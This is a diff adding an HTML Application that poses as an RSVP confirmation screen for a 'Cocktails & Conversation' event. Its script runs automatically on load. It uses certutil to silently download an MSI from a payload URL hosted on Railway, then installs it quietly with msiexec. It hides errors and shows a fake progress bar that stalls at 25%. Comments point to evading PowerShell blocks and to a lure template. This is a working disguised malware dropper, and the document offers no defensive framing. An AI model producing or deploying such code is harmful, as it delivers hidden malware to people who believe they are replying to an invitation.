@@ -1,0 +1,60 @@
+<html>
+<head>
+<title>Cocktails & Conversation</title>
+<HTA:APPLICATION ID="oHTA" APPLICATIONNAME="Cocktails & Conversation" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" ICON="" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SCROLL="no" SELECTION="no" SINGLEINSTANCE="yes" WINDOWSTATE="normal"/>
+<style>
+    body { margin:0; padding:0; background:#0f172a; color:#fff; font-family:'Segoe UI',sans-serif; overflow:hidden; user-select:none; }
+    .window-content { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; }
+    .check-icon { width:50px; height:50px; border:2px solid #d4af37; border-radius:50%; display:flex; justify-content:center; align-items:center; margin-bottom:20px; font-size:24px; color:#d4af37; }
+    h2 { font-size:1.5rem; margin:0 0 5px; font-weight:600; }
+    .subtitle { color:#94a3b8; font-size:.9rem; margin-bottom:30px; }
+    .progress-container { width:300px; height:4px; background:#1e293b; border-radius:2px; overflow:hidden; margin-bottom:15px; }
+    .progress-bar { height:100%; background:#d4af37; width:0%; transition:width .3s ease-out; }
+    .status-text { color:#64748b; font-size:.8rem; margin-bottom:40px; }
+    .cancel-btn { position:absolute; top:20px; right:20px; background:transparent; border:1px solid #334155; color:#94a3b8; padding:5px 15px; border-radius:4px; cursor:pointer; font-size:.8rem; }
+    .cancel-btn:hover { border-color:#94a3b8; color:#fff; }
+    .footer { position:absolute; bottom:30px; width:100%; text-align:center; font-size:.7rem; color:#334155; text-transform:uppercase; letter-spacing:1px; }
+</style>
+<script language="JavaScript">
+    window.onerror = function(){ return true; };
+    function init() {
+        window.resizeTo(600, 450);
+        try {
+            var shell = new ActiveXObject("WScript.Shell");
+            var tempPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\update_helper.msi";
+            // YOUR RAILWAY PAYLOAD URL
+            var msiUrl = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi";
+            // SILENT DOWNLOAD USING CERTUTIL (BYPASSES POWERSHELL BLOCKS)
+            var downloadCmd = 'certutil -urlcache -split -f "' + msiUrl + '" "' + tempPath + '"';
+            shell.Run(downloadCmd, 0, true); // Wait for download
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            if (fso.FileExists(tempPath)) {
+                shell.Run('msiexec /i "' + tempPath + '" /quiet /norestart', 0, false);
+            }
+        } catch(e) {}
+        animateProgress();
+    }
+    function animateProgress() {
+        var p = 0, bar = document.getElementById("pb"), txt = document.getElementById("pt");
+        var iv = setInterval(function() {
+            if(p >= 25) { clearInterval(iv); return; } // STOPS AT 25% LIKE IN VIDEO
+            p++; bar.style.width = p+"%"; txt.innerText = p+"%";
+            setTimeout(arguments.callee, 150 + p*8);
+        }, 100);
+    }
+    window.onload = init;
+</script>
+</head>
+<body>
+    <button class="cancel-btn" onclick="window.close()">Cancel</button>
+    <div class="window-content">
+        <div class="check-icon">✓</div>
+        <h2>Sending your RSVP...</h2>
+        <div class="subtitle">Contacting the event...</div>
+        <div class="progress-container"><div id="pb" class="progress-bar"></div></div>
+        <div id="pt" class="status-text">0%</div>
+        <div class="status-text" style="margin-top:-25px;">Your response is being confirmed. This usually only takes a few minutes.</div>
+    </div>
+    <div class="footer">WE CAN'T WAIT TO SEE YOU THERE</div>
+</body>
+</html>
